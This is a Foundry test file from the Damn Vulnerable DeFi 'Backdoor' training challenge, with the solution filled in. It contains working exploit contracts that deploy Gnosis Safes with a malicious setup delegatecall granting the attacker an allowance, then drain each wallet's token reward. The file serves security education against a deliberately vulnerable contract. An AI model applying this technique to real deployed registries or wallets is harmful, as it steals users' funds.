// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * =========================================================
     * SOLUTION - test_backdoor()
     * =========================================================
     * Attack: malicious Safe.setup module delegatecall backdoor
     * 1. Deploy one attacker contract; its constructor is the only player tx.
     * 2. For each of the 4 beneficiaries, the attacker builds a Safe.setup()
     *    initializer whose `to`/`data` delegatecall an Approver that makes the
     *    fresh Safe approve(attacker, 10 DVT) during initialization.
     * 3. createProxyWithCallback() deploys the Safe, runs the setup delegatecall,
     *    then WalletRegistry.proxyCreated() pays 10 DVT to the Safe.
     * 4. After each proxy returns, the attacker transferFrom(Safe -> recovery).
     *
     * Everything runs inside the single attacker constructor call, so
     * vm.getNonce(player) stays at 1.
     * =========================================================
     */
    function test_backdoor() public checkSolvedByPlayer {
        new BackdoorAttacker(
            users,
            address(walletRegistry),
            address(walletFactory),
            address(singletonCopy),
            address(token),
            recovery
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT - Approver
 * =========================================================
 * Tiny module that is delegatecalled from within Safe.setup(). Because the
 * call runs in the new Safe's storage/identity context, the token.approve()
 * is executed AS the Safe - granting the attacker an allowance over the
 * Safe's (soon-to-arrive) DVT reward.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice Approves a spender to move a Safe's tokens, run via setup delegatecall.
 * @dev Must be a separate contract so Safe.setupModules() can delegatecall it.
 */
contract Approver {
    function approve(address token, address spender, uint256 amount) external {
        // Runs in the Safe's context via delegatecall: msg.sender to the token is the Safe.
        IERC20Like(token).approve(spender, amount);
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT - BackdoorAttacker
 * =========================================================
 * Orchestrates the whole exploit in its constructor (a single player tx).
 * For each beneficiary it deploys a backdoored Safe, lets the registry fund
 * it, then drains the funded reward to the recovery address.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice One-transaction drainer for the WalletRegistry backdoor.
 * @dev Loops over beneficiaries; each Safe.setup embeds an Approver delegatecall.
 */
contract BackdoorAttacker {
    constructor(
        address[] memory beneficiaries,
        address registry,
        address factory,
        address singleton,
        address token,
        address recovery
    ) {
        Approver approver = new Approver();

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            // Single-owner Safe whose only owner is the beneficiary (registry requires this).
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            // setup `to`/`data`: delegatecall Approver.approve(token, this, 10 DVT)
            bytes memory setupData = abi.encodeWithSignature(
                "approve(address,address,uint256)", token, address(this), 10e18
            );

            // Build the Safe.setup() initializer. fallbackHandler MUST be address(0)
            // because the registry rejects any non-zero fallback manager.
            bytes memory initializer = abi.encodeWithSelector(
                ISafeSetup.setup.selector,
                owners,              // _owners
                uint256(1),          // _threshold
                address(approver),   // to (delegatecall target)
                setupData,           // data (Approver.approve call)
                address(0),          // fallbackHandler
                address(0),          // paymentToken
                uint256(0),          // payment
                payable(address(0))  // paymentReceiver
            );

            // Deploy the proxy; the factory invokes registry.proxyCreated() as the
            // callback, which funds the new Safe with 10 DVT after setup has run.
            ISafeProxyFactory(factory).createProxyWithCallback(
                singleton, initializer, i, registry
            );

            // The new Safe now holds 10 DVT and has approved us. Drain it to recovery.
            address wallet = WalletRegistry(registry).wallets(beneficiaries[i]);
            IERC20Like(token).transferFrom(wallet, recovery, 10e18);
        }
    }
}

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface ISafeSetup {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface ISafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);
}
